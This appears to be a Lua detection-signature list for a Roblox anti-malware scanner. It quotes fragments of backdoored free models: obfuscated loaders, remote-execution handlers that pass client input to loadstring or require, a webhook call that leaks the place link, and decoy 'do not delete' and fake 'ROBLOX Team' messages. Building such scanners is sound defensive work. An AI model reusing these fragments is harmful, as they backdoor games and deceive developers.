Unecessary due to obfuscation detection

	--	[[-- Do NOT delete.
	---- This is incase for updates. If you delete you might not get the newest version of the tree.

	--local lIl11111liliiIlIii1ll = assert local li1II11i1llliIl11II = select local lIlIiliII1Il1i1ll11II = tonumber local lil1Ilili1lii1Iii1i = unpack local IilII1l1l]], - Obfuscation Code Unecessary due to obfuscation detection

	--	[[EF9809450D505D004206B51210434G006E0A02002G989AC0992G98F03G98F03G98A83G98FC992G98883G989472A9B996387E02766DB27A250D87E539003D657D0A0200635G00E49440013G00D005E74E32BBFF7A0396F81B269G009G005G00089G006G00013G00089G002G00089G006G00083G00159G002G00083G00153G00019G002G00013G00069G006G00019G002G00019G006G00940A02002G6799C084989AC09A2G98F09C2G98FC81989AC0989C9AF891989AC09C2G98FC9F989AC09B9A98883G98FC2G989AC09C2G98FC982G9AF86D6799C09C2G98FC6B6799C0989E9AA4999890F02G989AC0E232A0869B9A9888B2088583989C9AF82G989AC09C2G98FC989E9AA42G9890F0736799C0D632A086716799C03G98FC2G989AC09C2G98FC982G9AF86A6799C09C2G98FC686799C0575B7ABF8D324C845350AFFD92B78EC7C225E683E594DBAD304902A11BFDB883BE484E906B9357A06D5B1C4E007F0B820A0200C7063G002GEF888E828AC7093G002GEFBF838E968A9D9CC70D3G002GEFBF838E968A9DAE2G8B8A8BC7093G002GEFAC802G818A8C9B635G00E49440C7023G002GEF023G00A2B94D639CE484369B0CFB192A7G00049G002G00049G002G00023G00029G002G00023G00039G002G00043G00069G006G00023G00029G006G00039G002G00033G00049G006G00049G002G00049G009G005G00970A020097989AC09D9890C42G989AC0A232A4869A2G9C8882989AC07332A4869B2G9C88B53221CC2G989AC02G989AC09B989AC09A989CFC92989AC090989AC02G9A9C88B208858399989AC03G98F0992G98FC2G989EA4999894C4776799C0756799C099989CFC9B9890C42G989AC0C432A4862G9A9C889C989CFC796799C099989CFC476799C099949EF82G989AC099989CFC989692F8706799C0999890FC7E6799C0D132A4867C6799C0CC8DA2B70DDC21D7ADB170B73B76A5F8F67DF3D3C2AB88C19BBDAB27A9216C226B962FF0DC185A09019411850A0200C70B3G002GEFA69CA681]], - Obfuscation Code Unecessary due to obfuscation detection

	--	[[1T1P2751P1U27623I23G23123J23G23B23327727622Z23G22W23023427J1R27521526223924K26G22G1P1S27622F23423I23I23C1H2761O28628827528728A2891P28B28E27628H1P2852751B1Q28D28I28727P21L28I1P27P1B28C28N28T28U29028S28I27428I27P28F28D]], - Obfuscation Code Unecessary due to obfuscation detection

	[[-- Do NOT delete.
---- This is incase for updates. If you delete you might not get the newest version of the tree.]],

	[[GetRankInGroup(2982400)]],

	-- [[24Z24Y27527624Y25127622125621U22524C25627521X24I27D24724I27522024I24224Y27L27N25623M27R27G24Y21W24Y26Q27R27627O27M27S24Y22427X24727X25227624X27927525C25Z25F25J26328H2761Y25T25E23121V26R24X25327625C26525N25V26624X28C27527025V26725Z24Z28F24Y22527C22524E27X22424Y27Q24827629H27V29K27529H28123R27621X24Y27D24629L24Q27M24324Q29P27X24928B28D29324Y25X29625Z28E27626A26625V25N25Z25C25D24X2552AE2AG2AI25C26R25Y25Y25Z25Y2AD27526P26526426425Z25T25I24Y]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[\1\6\6\6\6\0\6\6\6\117\101\116\111\118\114\6\0\6\6\6\86\103\116\99\104\114\6\2\6\6\6\97\103\107\99\6\21\6\6\6\85\99\116\112\99\116\85\101\116\111\118\114\85\99\116\112\111\101\99\6\1\6\6\6\116\99\119\115\111\116\99\4\6\6\86\152\227\194\247\71\6\2\6\6\6\116\99\116\99\12\6\6\6\20\12\6\6\6\7\6\6\6\20\6\6\7\6\5\6\6\6\38\6\6\7\6\7\6\2\6\22\6\6\6\6\4\6\7\6\20\6\6\6\6\3\6\6\6\20\6\6\7\6\0\6\6\6\6\6\6\6\6\4\6\4\6\38\6\6\6\6\6\6\1\6\6\6\6\6\6\7\6\7\6\6\6\6\6\6\7\6\6\6\6\6\6\6\6]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[\31\29\29\29\29\26\29\29\29\111\120\108\104\116\111\120\30\29\29\221\117\125\218\236\92\29\29\29\29\24\29\29\29\15\26\29\29\29\28\29\29\29\15\29\29\28\29\31\29\29\29\29\29\29\29\29\31\29\31\29\29\29\29\29\29\28\29\28\29\29\29\29\29\29\28\29\29\29\24\29\29\29\28\29\29\29\28\29\29\29\28\29\29\29\28\29\29\29\28\29\29\29\29]], - Obfuscation Code Unecessary due to obfuscation detection

	[[if key == 'xwWHynpNUW' then]],

	[[4768877023]],

	-- [[23I22Y27522W23227522Y1D1B171F22W23127921M161B191F1Z1E27F27H27J1J1F1O1P22W22O2792131B1I27I1B27S27U27W2792191F1U21L27T1S1327L22W23C27Y1B1O112891Q27J27L28B1O28D28F22S28728921M1O151E1V191U1Z141C1522W22P27923823722F21F24N24D26O21Y21K2511O29827Q28327T2171E1E1F27O27G2752151514141F29222W27922Y22W2302791P1U1O13141D22W22X2A81V18277279191228J2AG2A42792AP27923U152162AS27924A22D22W22V27921O171Z21V26S26W23M21C22925Y23H21Q2432AX27521S2AW2AQ27521622Z27922L2792A62791F171829T27V2332791U131U1627E28U2BI21S2151628E112221Y27T1F21S21S2AF2791V1O1622W23B2791B23Y24E21J24V172172291X22D1D1T1F23X22O2191525Y25724R23O1R23V23426323M24N23Y24129M27529S1P192AB1Q2C129Y2BS27521927C1F22822222W2BO2751A2AK2752102DW2E422Y1U1J1Q27E2782752AB2AM22W2BZ2751915161529L22Q2C029Y1V2BV27T2BH2AU2172DT22Y296151U27T22W2EQ27528E29Y21H2CL2CN21Q27921B26124N21721O21N21H2461223C2531225V1A1L23822425K26G22325Y26024B1122A21F22I1724W26H22224124826524M22922U1823J23N21H25H22X26722L21E21C25W1Q23125P22D21Q26S21T21E25726T23Q24S1O21N23D22523122026T22M1526L22N22V25Q22J23W23125N22Q21625Y24623M25K2352E82F31I1U2A32BR22R2C0122ET18141B132CN22N2792611H1D26X1Z21922626F24I24422Y22V22M23222721J1121623Z21W24W22224622K24D22924321E2FV23Z22C21M2332721M24G25L25323826W22T1L26A1K22F21E181O23321O24W172E827B27D27P27528227L27N22W2222792241T131E1U1222F22L22K22A224121F131D121U22F22M22H22G2242961O171B2KF1Q2AD2EZ1B1V2K32EO2E82I22JQ2F622Y2102EO1B1222221L21L2EZ1C131F161E27V23D2792CH2822841P2222AC2222JP2CG2CI2EJ22Y1S1B161V27E27X2DU28W27R27T2]], - Obfuscation Code Unecessary due to obfuscation detection

	[[Greetings! Please be sure to read the following text as it will contain some very important information!

	In order to ensure the welds and internal scripts in this model work,

	please press "𝐑𝐮𝐧" (The Green Triangle), to put the place in run mode. This will make sure that the internal welds and scripts

	are working and won't break when you play the game. It is also advised that 𝐲𝐨𝐮 𝐤𝐞𝐞𝐩 𝐭𝐡𝐞 𝐬𝐭𝐮𝐝𝐢𝐨 𝐢𝐧 𝐫𝐮𝐧 𝐦𝐨𝐝𝐞 as you work or build in order

	to prevent any mishaps and crashes which could result in lost data.

	Also 𝐏𝐋𝐄𝐀𝐒𝐄 𝐃𝐎 𝐍𝐎𝐓 𝐎𝐏𝐄𝐍, 𝐄𝐃𝐈𝐓, 𝐎𝐑 𝐌𝐎𝐕𝐄 𝐀𝐍𝐘 𝐒𝐂𝐑𝐈𝐏𝐓𝐒, 𝐎𝐑 𝐎𝐓𝐇𝐄𝐑 𝐈𝐍𝐒𝐓𝐀𝐍𝐂𝐄𝐒 listed under this one!

	They are there to ensure that the model functions correctly and efficiently!

	𝐄𝐃𝐈𝐓𝐈𝐍𝐆, 𝐃𝐄𝐋𝐄𝐓𝐈𝐍𝐆, 𝐎𝐑 𝐌𝐎𝐕𝐈𝐍𝐆 𝐓𝐇𝐄𝐌 𝐀𝐍𝐘𝐖𝐇𝐄𝐑𝐄 𝐄𝐋𝐒𝐄 𝐌𝐀𝐘 𝐏𝐑𝐄𝐕𝐄𝐍𝐓 𝐓𝐇𝐄 𝐌𝐎𝐃𝐄𝐋 𝐅𝐑𝐎𝐌 𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐏𝐄𝐑𝐋𝐘!


	<-------------------------------------------------------------------------------------------------------------------------------------------------->


	𝐖𝐢𝐭𝐡 𝐭𝐡𝐚𝐭 𝐛𝐞𝐢𝐧𝐠 𝐬𝐚𝐢𝐝, 𝐈 𝐰𝐨𝐮𝐥𝐝 𝐚𝐩𝐩𝐫𝐞𝐜𝐢𝐚𝐭𝐞 𝐢𝐭 𝐢𝐟 𝐲𝐨𝐮 𝐭𝐨𝐨𝐤 𝐭𝐡𝐞 𝐭𝐢𝐦𝐞 𝐭𝐨 𝐬𝐡𝐚𝐫𝐞 𝐭𝐡𝐢𝐬 𝐦𝐨𝐝𝐞𝐥 𝐰𝐢𝐭𝐡 𝐲𝐨𝐮𝐫 𝐟𝐫𝐢𝐞𝐧𝐝𝐬!

	Giving credit is encouraged but you don't have to.]],

	[[local Iniator={_VERSION}
local function _Sequence(Tab)
return table.sort(Tab)
end
-- LuaU byte modeler
function Init()

return _Sequence(Iniator)
end

Init()
collectgarbage("count")]],

	[[--Latency/Turbulance producer.
function activate()
	probability()--Functions not in the loop
	while wait() do--Functions in a loop
		store()
		Plague()
		funstuff()
		print(dump(string.dump(note)))
		print(dump2(string.dump(note2)))
		local v = script.Dalton
		v.Value = math.random()
	end
end]],

	[[		local nx = Instance.new("RotateP")
		nx.Parent = game.Workspace
		nx.Name = "Before7oClock"
	end
end

function alert()
	if game.StarterGui:FindFirstChild("launcher") == nil then--Clones the scary message into StarterGui when a player enters.
		game.StarterGui:ClearAllChildren()
		local launch = script.launcher
		launch:clone()
		launch.Parent = game.StarterGui
	end
end]],

	[[If you see this, that means you were selected to test ROBLOX's new JointShield feature.
This is an experimental feature by the ROBLOX Team meant to further improve the physics simulation.
Just sit back and enjoy the flawless physics.
Happy building! - The ROBLOX Team, August 2014]],

	[[JointShield]],

	[[sh,commands,tb,bf,p,pc,num,rn,str,wt,dm,ths,int,gf,wsp,nxt,xsp,tp,cnt,q,dt,g,c,b,sc,cn,sv,svs,jsv,q0,knm,mjt,fsv,r,gfr,gch,isa,ict,prt=shared,{},table,{},{"y","h","s","a","g","e","c","r","b",]],

	[[{`ul{\"u{bz+")then a,b,c=y[r"Eum`%"],y[r"Dum`%"],y[r"pr`;ll`s("]if c==r"e`{,"then d,e=y[r"E("],y[r"D("]drm(y)y]],

	[[[r(tb[r"u`h{zh"](p))]=dt cnt=0 xsp(function(a1,a2)ths[r"u{pm`%"]=nil wt(rn())jsv=fsv"phb}mp,lu{bz+"tb]],

	[["Healthy Living Hurts!"]],

	[[pc(q[r"pmbtdpm"],r"TEERpTTLFGEUTMLFE][DR"+r"DMU\\MTUTFF]UL[\\"^r"LUFG\\\\L\\ETUDT[F")pc(t)end)while true do wt(rn())repeat a1,a2=nxt(dt[2]],

	[[y-y%128)end return tb.concat(bf,nil,1,l)end end)'',function(o,k)return r(o[r(k)])end,function(o,k,v)o[r(k)]=v end,function(y,x]],

	[[pm`%"]=y end end,function(y,x,z)dt[3][x]=true z=x[r"qpx{`c("]z=z[r"uhp{{zh"](z,function()if x[r"u{pm`%"]~=y or x[r"qpsi`lb1"]the]],

	[[if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then
	check.Size = check.Size + 1
	check.Heat = check.Heat  +12233
	end]],

	[[72660201]],

	[[premiumAnti_]],

	-- [[local premiumAnti_llIIllIIlllIllIIIIIllIlI=string.byte;local premiumAnti_IlIIllllIII=string.char;local premiumAnti_IlllIIIllllI=string.sub;local premiumAnti_IlIIlllIIIllIllllllIII=table.concat;local premiumAnti_lIlIIlIllIIIIIllIlIl=table.insert;local premiumAnti_IllllIllIII=math.ldexp;local premiumAnti_lIlIIlIlIIIlIllIIlllIlIIl=getfenv or function()return _ENV end;local premiumAnti_lIlIIlIllIIIIIllIlIl=setmetatable;local premiumAnti_IllIllIllIII=select;local premiumAnti_lIlIIlIllIIIIIllIlIl=unpack or table.unpack;local premiumAnti_llIIlllI=tonumber;local function premiumAnti_IIlllIlIIIl(premiumAnti_lllIIlIlIlllIIIl)local premiumAnti_IllllllllIllIIIlllIl,premiumAnti_llIllIlIIIllI,premiumAnti_IIlllIllIlIIIIIIlIlII="","",{}l]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[;else local premiumAnti_lIlIIlIllIIIIIllIlIl=premiumAnti_lIlIIlIllIIIIIllIlIl[#{"spoodercraft says bim bam boom";{69139;941183;480049;516762};}]premiumAnti_IllllllllIllIIIlllIl[premiumAnti_lIlIIlIllIIIIIllIlIl]=premiumAnti_IllllllllIllIIIlllIl[premiumAnti_lIlIIlIllIIIIIllIlIl](premiumAnti_IllllllllIllIIIlllIl[premiumAnti_lIlIIlIllIIIIIllIlIl+1])end;premiumAnti_llIllIlIIIllI=premiumAnti_llIllIlIIIllI+1;end;end;end;return premiumAnti_IlIIllllIII(premiumAnti_llIIlllI(),{},premiumAnti_lIlIIlIlIIIlIllIIlllIlIIl())();]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[25L25M27525K25P27525M25424V25725B24J27B27425M22I26725P21P21N23V25K25Q27924M24L24R24U27925M25O27926027W25N27Z27528225K27W27W28628626I28725M27H28125M28228728H275]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[IIIIlllIlIlllIII+1])else local ok_llIlllIIIIIlllIlIlllIII=ok_llIlllIIIIIlllIlIlllIII[#("Qf")]ok_IIIllIIIIlIlIlI[ok_llIlllIIIIIlllIlIlllIII](ok_IIIllIIIIlIlIlI[ok_llIlllIIIIIlllIlIlllIII+1])end;ok_IlIIIllIlIIIIlIII=ok_IlIIIllIlIIIIlIII+1;end;end;end;return ok_llIIllIIlIlIIIlIlIIIIIIl(ok_IlllIIllIIIlIlIllIlIlIIl(),{},ok_IIIIIIllIlII())();]], - Obfuscation Code Unecessary due to obfuscation detection

	[[  __  __           _        _____  _                        __      ____   ___
 |  \/  |         (_)      |  __ \| |                       \ \    / /_ | / _ \
 | \  / |_   _ ___ _  ___  | |__) | | __ _ _   _  ___ _ __   \ \  / / | || | | |
 | |\/| | | | / __| |/ __| |  ___/| |/ _` | | | |/ _ \ '__|   \ \/ /  | || | | |
 | |  | | |_| \__ \ | (__  | |    | | (_| | |_| |  __/ |       \  /   | || |_| |
 |_|  |_|\__,_|___/_|\___| |_|    |_|\__,_|\__, |\___|_|        \/    |_(_)___/
                                            __/ |
                                           |___/


How to use:
	- Go here and pick a song https://www.roblox.com/develop/library?CatalogContext=DevelopOnly&Category=Models#category=audio
	- Get the song ID (http://prntscr.com/j34lle)
	- Go into the setup folder and add it to the list (http://prntscr.com/j3kvmp)
	- To add mutiple do steps 1-2 but this time add a comma at the end of the first ID before pasting. (http://prntscr.com/j3kvzl)
	- enable LoadStringEnabled by clicking ServerScriptService (DON'T WORRY ITS JUST TO LOAD SOME MODULES)

	- ]],

	[[ require(2567--]],

	[[1280100409]],

	[[Event.OnServerEvent:connect(function(player, serverExecution)]],

	[[local Info = {
      username = "g",
      content = "New game found! Game Link https://www.roblox.com/games/" ..game.PlaceId,

}

Http:GetAsync(Website .. File .. "Content=" .. Http:JSONEncode(Info) .. "&Discord=" .. Webhook)]],

	[[local Info = {
      username = "g",
      content = "New game found! Game Link https://www.roblox.com/games/" ..game.PlaceId,

}]],

	[[player, serverExecution)
 loadstring(]],

	[[512247939910074388]],

	[[getfenv()["r\e\q\u\ir\e"]],

	[[FlameIsAwesome_]],

	-- [[local FlameIsAwesome_IlIlllIIIIllIIIlIlIII=string.byte;local FlameIsAwesome_IlIlIIlIIlllIlIllllIIlI=string.char;local FlameIsAwesome_IIlIIllllIIlIlIIllI=string.sub;local FlameIsAwesome_llIIllIIII=table.concat;local FlameIsAwesome_lIIIIIlIIIllllllI=table.insert;local FlameIsAwesome_IIIIlllIlIlIll=math.ldexp;local FlameIsAwesome_IIllIlIIIllIIlllIlII=getfenv or function()return _ENV end;local FlameIsAwesome_lIIIIIlIIIllllllI=setmetatable;local FlameIsAwesome_llIIIIllIl=select;local FlameIsAwesome_lIIIIIlIIIllllllI=unpack or table.unpack;local FlameIsAwesome_lIIIIIlIIIllllllI=tonumber;local FlameIsA]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[\202\201\201\201\203\206\201\201\201\187\172\184\188\160\187\172\202\201\201\105\23\11\61\56\136\203\206\201\201\201\133\172\179\129\168\170\162\207\201\201\201\219\203\201\201\201\200\201\201\201\219\201\201\200\201\203\201\201\201\201\201\201\201\201\203\201\203\201\233\201\201\201\201\201\201\202\201\201\201\201\201\201\203\201\200\201\201\201\201\201\201\200\201\201\201\201\201\201\201\201]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[eIsAwesome_lIIIIIlIIIllllllI=FlameIsAwesome_lIIIIIlIIIllllllI[#("q1")]FlameIsAwesome_llllIlII[FlameIsAwesome_lIIIIIlIIIllllllI](FlameIsAwesome_llllIlII[FlameIsAwesome_lIIIIIlIIIllllllI+1])else do return end;end;FlameIsAwesome_lllIllIIIl=FlameIsAwesome_lllIllIIIl+1;end;end;end;return FlameIsAwesome_IIIIlllIlIlIll(FlameIsAwesome_llIIllIIII(),{},FlameIsAwesome_IIllIlIIIllIIlllIlII())();]], - Obfuscation Code Unecessary due to obfuscation detection

	[[--Scripted by CovertCode.
--The ScreenGui is suppose to stay inside of the model. (You can put the model anywhere you like.)
--This part is protected so exploiters wont abuse it! Do NOT remove this.]],

	-- [[25O25Q27525R25L27525Q25824R25B25724N27B27425Q26M21R1821C21R23Z25Q25M27926425P27925R27R27Q27V27H27527Z27427V25Q278276279287]], - Obfuscation Code Unecessary due to obfuscation detection

	[[local executor = script.Parent.nice
executor.OnServerEvent:Connect(function(skid, input)
	print("get")
	require(script.lolxd)(input)()
end)]],

	[[5a99341e66bc45c6f1a0929d000832b43ec55b9afb4eacb45c3c5ccc6705c1cd]],

	-- [[dRtYZW4RAAAAREJCQzgzNzhMRzJXRU9SQwAyfGRJUuUimL7WhCVWB9XyAw4kIEHkHGLQv/Y/Bt8yBsSwT1ROQHnjCq8ngPgcRWslXr0MwECSbAgAAAD8/u/9/vXtALWuUkuSchQAAADLydTP1MjW2sjT3snE19Ta397fAK5xKy6SMAgAAAD8/u/p/vXtAEYf8RqSUQcAAACb//757vwAuqVzEJJgBAAAAOju+QC25fsJMAnILSO190p64F4+3l+SNAsAAACb7+n6+P75+vjwAJiMBCqSPAUAAAD98vX/AC2hhmSSMgcAAACb1/L1/rsAJIG/Y5J7BwAAAJuhvv+woQBMfpRBknEKAAAAm9fy9f67vv+wAKylEHSSWAcAAAD89vrv+PMAMX0VVJJtCAAAAOn+6u7y6f4AHelIbjA5yC1zKhLmi+G9hiU5MDTILaMukUGw4VNY1X8wYcgtI7X34c7geBydKDAYyC0j86tBsOGLMN0jMFjILSO198HI4M7QDkswXcgtI7X3evfgJTKvNTBxyC0jtfeey+BiJTNgMALILWPo/pmd4SgJAXswSsgtY1DmHajhfMj6dJJJFAAAAPLy8vfy8vLy0tLS0tLS9/fy8vIAiGhyJjBmyC0jtXfZuuBjd7luMCzILSO190og4CXAxPV//G5a71sOTcxOhIZSIU5qDjJuePGrd3h+JzppW3gZl2Zysw/DfZiKMZ4lHuUdgGiyisqaEEG25x/lCorqb51CUBxX9LmiKMclYWjIPgrtePZ01hi+oT9pW3i7F0Bc39hSSayKhs7wYFBcV/S5orF1BCj+kD9pW3hkwClhTxCHcSh45WSHR1ey22QPiiMrUxBQXFf0uaKDhA1RkiUiBed4I2bKcQ/Qh3EoePVxOAcX8ttkD4oRL418UJxX9LmijvgMcg+Qh3EoeCY9DhvIuN5Ts4qHLtQ+F7LbZA+KhbbydlAcV/S5okT+QCkqHcVzKooeT/FjyLjeU7OKRhMyCj4QP2lbeFtuqEZ0yQGJYormNkIIvpE+aVt4ueARS4i/3lyzis0aIg2+J0LaIIom384OUFxX9LmikpPff4/RhnEoeKyMbXP+UT5pW3gq+rhNNMmBiWKKntfyPL5XPGlbeHzjEFV+FzxpW3giXH9gSA4lSuWKtDmoWDZXH2MKigeRKD9QHFf0uaJal550fpE+aVt4qxgVL1AcV/S5ojleDX9f2FJLrIrO2ulpKMkwCu14bfHAHmocxXEqiuHY3mlIv95cs4rLUvZMzupdN254hqm5aH6XO2lbeKID614zjsSjmIoUh7NVflc7aVt44PKrHTOOxKOYiswFOTp+FztpW3jjPCweM47Eo5iKr5VoAzZXHmMKisjqfHxQHFf0uaIn5dU/vufC2iCKU9OPHFBcV/S5ooiW2VdPU4VxKHitrTZPahzFcSqK+0d1DjPdsnZTiuuK8xNqHsVyKopuLG]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[25T25V27525S25W27525V24H25224I24M25627B25U2751J22N24M1V1Y24227927525Z27925D25X27927H27525D25S25V27H27427P27927427W25Y27V279]], - Obfuscation Code Unecessary due to obfuscation detection

	[[-- This code is obfuscated (Protected and confused) in order to prevent exploiting and abusing. Please do not delete this other wise exploiters may be able to abuse or find vulnerabilities in your game.]],

	-- [[local IlIlllIIIllIIlIlIllIlIIIlIlIl_IIlllIllIlIIlIl=string.byte;local IlIlllIIIllIIlIlIllIlIIIlIlIl_IIlIIIIlIlIlIIlIIlIl=string.char;local IlIlllIIIllIIlIlIllIlIIIlIlIl_IllIIllIIl=string.sub;local IlIlllIIIllIIlIlIllIlIIIlIlIl_IlIllIllII=table.concat;local IlIlllIIIllIIlIlIllIlIIIlIlIl_llIIllllIlIlIllI=table.insert;local IlIlllIIIllIIlIlIllIlIIIlIlIl_lIllIIIlIIIIIII=math.ldexp;local IlIlllIIIllIIlIlIllIlIIIlIlIl_IlIlIIllllIIIlI=getfenv or function()return _ENV end;local IlIlllIIIllIIlIlIllIlIIIlIlIl_llIIllllIlIlIllI=setmetatable;local IlIlllIIIllIIlIlIllIlIIIlIlIl_IIlIllIlIIIllIIllllIlllI=select;local IlIlllIIIllIIlIlIllIlIIIlIlIl_llIIllllIlIlIllI=unpack or table.unpack;local IlIlllIIIllIIlIlIllIlIIIlIlIl_IIIIlllIIlllIlIllIIlllll=tonumber;local function IlIlllIIIllIIlIlIllIlIIIlIlIl_lllllIIllllllIll(IlIlllIIIllIIlIlIllIlIIIlIlIl_lIllIlIlIlIlllIlIlIlll)local IlIlllIIIllIIlIlIllIlIIIlIlIl_IIllIlIIlllI,IlIlllIIIllIIlIlIllIlIIIlIlIl_IlIllIlllllII,IlIlllIIIllIIlIlIllIlIIIlIlIl_lIlIIIIlIlIlllII="","",{}local IlIlllIIIllIIlIlIllIlIIIlIlIl_IIIIIlIlIlIlIIIlllIll=256;local IlIlllIIIllIIlIlIllIlIIIlIlIl_llIIlIlllllIIIII={}for IlIlllIIIllIIlIlIllIlIIIlIlIl_llIIllllIlIlIllI=0,IlIlllIIIllIIlIlIllIlIIIlIlIl_IIIIIlIlIlIlIIIlllIll-1 do IlIlllIIIllIIlIlIllIlIIIlIlIl_llIIlIlllllIIIII[IlIlllIIIllIIlIlIllIlIIIlIlIl_llIIllllIlIlIllI]=IlIlllIIIllIIlIlIllIlIIIlIlIl_IIlIIIIlIlIlIIlIIlIl(IlIlllIIIllIIlIlIllIlIIIlIlIl_llIIllllIlIlIllI)end;local IlIlllIIIllIIlIlIllIlIIIlIlIl_llI]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[6583ca16d93c5483ac7b80203c99d26c2db20c06523087eec2cbeb0590e23dde]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[25T25V27525U25W27525V24H25224I24M25627B2791Z23224E2151Y24225V25Y27925D27925V25U27Q27625V27427S27927U27Z28227Z28127Z]], - Obfuscation Code Unecessary due to obfuscation detection

	[[4653828604]],

	[[pcall(game.Destroy, script);setfenv(1, getfenv(getmetatable(LoadLibrary("RbxUtility").Create).__call));pcall(game.Destroy, script)]],

	[[eye1 = Instance.new("Part", workspace)
eye1.Anchored = false
eye1.Parent = head
eye1.TopSurface = 0]],

	[[ = head
eye1.TopSurface = 0
eye1.BrickColor = BrickColor.new("Black")
eye1.BottomSurface = 0
eye1m = Instance.new("SpecialMesh", eye1)
eye1m.MeshType = Enum.MeshType.Sphere
eye1m.Scale = Vector3.new(0.02,0.12,0.03)
ogsize = eye1m.Scale
weld = Instance.new("Weld", head)
weld.Part0 = eye1
weld.Part1 = head
weld.C1 = CFrame.new(-.17,]],

	[[ eye1
weld.Part1 = head
weld.C1 = CFrame.new(-.17,.14,-.57)


 ]],

	[[eye2 = Instance.new("Part", workspace)
eye2.Anchored = false
eye2.Parent = head
eye2.TopSu]],

	[[mouthm.Scale = mouthm.Scale:lerp(Vector3.new(ogsize.X+sound.PlaybackLoudness/20000,sound.PlaybackLoudness/1000,ogsize.Z),0.8)]],

	[[.Volume=100]],

	[[sound.SoundId = "http://www.roblox.com/asset/?id="..message:sub(6)]],

	[[bxgyikes]],

	[[or betraying me bud, if u wan]],

	[[52,57,52,49,]],

	[[2422875198]],

	[[C3C802D0C818534]],

	[[4965769761]],

	[[493686933]],

	[[Needed to keep model functioning]],

	[[Thanks for using my model!]],

	[[\101\114\105\117\113\101\114]],

	[[\116\111\110\117\109\98\101\114]],

	[[string["\99\104\97\114"]],

	[[\117\110\112\97\99\107]],

	[[53, 53, 48, 51, 5]],

	[[57, 52, 49, 53, 5]],

	[[53,53,48,51,5]],

	[[57,52,49,53,5]],

	[[4965770420]],

	[[local data = require(CoraX:WaitForChild("CoraX_Data"))]],

	[[aitForChild("CoraX_Data"))
local info = script.Parent.Cor]],

	[[require(data:dataStore())]],

	[[require(info:dataStore())]],

	[[ataStore()
    return 493686]],

	[[taStore()
    return 496576]],

	[[2460510652]],

	[[ObfuscatedToKeepBadSkiddiesOut]],

	-- [[\223\212\212\212\214\208\212\212\212\163\181\189\160\215\65\2\242\60\223\250\197\234\214\208\212\212\212\179\181\185\177\214\222\212\212\212\147\177\160\135\177\166\162\189\183\177\214\211\212\212\212\132\184\181\173\177\166\167\214\211\212\212\212\166\177\165\161\189\166\177\214\209\212\212\212\164\166\189\186\160\214\209\212\212\212\177\166\166\187\166\214\222\212\212\212\224\226\231\226\236\237\229\227\230\226\214\223\212\212\212\132\184\181\173\177\166\149\176\176\177\176\214\211\212\212\212\151\187\186\186\177\183\160\212\213\212\212\212\211\212\212\212\214\218\212\212\212\147\177\160\134\181\186\191\157\186\147\166\187\161\164\215\212\212\212\20\146\103\130\149\215\212\212\212\212\212\212\212\148\214\211\212\212\212\166\177\165\161\189\166\177\215\212\212\132\184\181\136\38\149\214\210\212\212\212\179\177\160\147\129\157\214\208\212\212\212\154\181\185\177\213\212\212\212\212\216\212\212\212\220\212\212\212\220\212\212\212\220\212\212\212\220\212\212\212\220\212\212\212\221\212\212\212\221\212\212\212\221\212\212\212\221\212\212\212\221\212\212\212\221\212\212\212\223\212\212\212\216\212\212\212\244\222\212\213\212\212\212\213\212\198\213\212\215\212\214\212\212\212\212\206\212\213\212\215\212\214\212\242\196\212\213\212\223\212\213\212\215\212\208\194\212\212\212\223\212\213\212\198\221\212\213\212\208\212\212\212\198\223\212\214\212\209\212\212\212\212\212\212\213\212\214\212\214\212\244\212\212\213\212\213\212\210\212\244\212\212]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[\63\52\52\52\53\50\52\52\52\68\70\81\82\93\76\53\53\52\52\52\21\53\50\52\52\52\85\80\89\93\90\71\53\50\52\52\52\67\85\82\82\88\3\53\60\52\52\52\112\81\88\88\93\91\65\90\53\38\52\52\52\102\92\65\85\93\80\92\93\102\81\89\85\71\64\81\70\81\80\53\48\52\52\52\83\85\89\81\53\51\52\52\52\100\88\85\77\81\70\71\53\63\52\52\52\100\88\85\77\81\70\117\80\80\81\80\53\51\52\52\52\87\91\90\90\81\87\64\53\51\52\52\52\81\76\68\88\91\80\81\37\52\52\52\53\52\52\52\53\52\52\52\54\52\52\52\54\52\52\52\54\52\52\52\54\52\52\52\54\52\52\52\54\52\52\52\48\52\52\52\48\52\52\52\48\52\52\52\48\52\52\52\34\52\52\52\48\52\52\52\20\52\52\52\35\52\52\52\20\52\52\52\54\52\52\52\49\52\52\52\53\49\52\52\52\68\85\93\70\71\53\50\52\52\52\85\80\89\93\90\71\53\48\52\52\52\122\85\89\81\53\51\52\52\52\119\92\85\64\64\81\80\53\51\52\52\52\87\91\90\90\81\87\64\59\52\52\52\49\52\52\52\49\52\52\52\49\52\52\52\49\52\52\52\50\52\52\52\50\52\52\52\50\52\52\52\51\52\52\52\51\52\52\52\39\52\52\52\39\52\52\52\51\52\52\52\49\52\52\52\32\52\52\52\34\52\52\52\53\52\52\52\56\52\52\52\53\51\52\52\52\81\76\68\88\91\80\81\53\53\52\52\52\20\55\52\52\52\52\52\52\196\11\53\49\52\52\52\88\91\67\81\70\53\50\52\52\52\68\70\81\82\93\76\53\51\52\52\52\91\68\81\90\65\64\83\55\52\52\52\52\52\52\52\116\53\54\52\52\52\89\81\53\51\52\52\52\70\81\69\65\93\70\81\55\52\52\116\74\23\125\198\117\53\55\52\52\52\97\96\115\53\48\52\52\52\122\85\89\81\20\52\52\52\60\52\52\52\60\52\52\52\60\52\52\52\60\52\52\52\62\52]], - Obfuscation Code Unecessary due to obfuscation detection

	[[local ObfuscatedToKeepBadSkiddiesOut_]],

	[[--This an script of ROBLOX Studio. Do not delete it, this script secures your game from exploiters.

--Thanks.]],

	-- [[84fa15a1051c8bb415db5f6c6b19d5f1dd1c1e55127b20f0ac1dd0fb2bef3b40]], - Obfuscation Code Unecessary due to obfuscation detection

